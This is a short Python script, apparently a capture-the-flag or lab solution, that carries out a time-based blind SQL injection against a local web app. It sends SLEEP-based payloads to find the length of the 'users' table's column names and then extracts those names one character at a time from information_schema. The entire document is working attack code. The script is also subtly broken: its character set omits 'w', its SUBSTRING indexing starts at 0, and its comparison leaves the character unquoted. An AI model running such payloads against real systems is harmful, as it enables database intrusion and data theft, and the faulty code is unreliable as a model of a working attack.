import requests

url = "http://localhost:5000/"
i=1
while True:
    sqlpayload = f'''admin' AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='users')>{i},SLEEP(4),0)-- -'''      
    response = requests.get(url+sqlpayload)
    if response.elapsed.total_seconds() > 3:
        i+=1
    else:
        break

columnname = ''
for j in range(i):
    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
        sqlpayload = f'''admin' AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='users'), {j}, 1)={s},SLEEP(4),0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.elapsed.total_seconds() > 3:
            columnname += s
            break
print(columnname)